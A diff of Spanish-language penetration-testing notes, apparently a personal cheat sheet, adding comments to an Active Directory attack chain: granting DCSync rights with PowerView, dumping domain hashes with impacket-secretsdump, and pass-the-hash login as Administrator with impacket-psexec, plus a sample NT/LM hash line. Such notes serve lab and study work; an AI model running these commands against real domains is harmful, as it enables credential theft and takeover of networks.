@@ -235,8 +235,12 @@ Pasos:
 
 # Agregar el privilegio de DCSync al usuario  
 ❯ $SecPassword = ConvertTo-SecureString 'password' -AsPlainText -Force
-	# password = Contraseña del usuario 
+	# password = Contraseña del usuario creado 
+	
 ❯ $Cred = New-Object System.Management.Automation.PSCredential('domain1.local\user', $SecPassword)
+	# user = Usuario creado 
+	# domain1.local = Dominio 
+
 ❯ Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=domain1,DC=local" -PrincipalIdentity user -Rights DCSync 
 	# user = Usuario que se agrego en la variable $Cred
 
@@ -247,7 +251,15 @@ Notas:
 # Hacer DCSync en Kali 
 ❯ impacket-secretsdump domain1.local/user@IP-DC    # Ejecutar el DCSync con el usuario creado
 	# IP-DC = La dirección IP del DC  
-❯ impacket-psexec domain1.local/Administrator@IP cmd.exe -hashes :hash   # Utilizar 'psexec' para ingresar con el usuario 'Administrator' haciendo 'Pass-The-Hash'    
+
+❯ impacket-psexec domain1.local/Administrator@IP cmd.exe -hashes :HashNT   # Utilizar 'psexec' para ingresar con el usuario 'Administrator' haciendo 'Pass-The-Hash'    
+
+NOTA:
+	Utilizar el hash NT
+	Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+	Donde:
+		- 32693b11e6aa90eb43d32c72a07ceea6 = HASH NT 
+		- aad3b435b51404eeaad3b435b51404ee = HASH LM
 ```
 
 ```powershell 
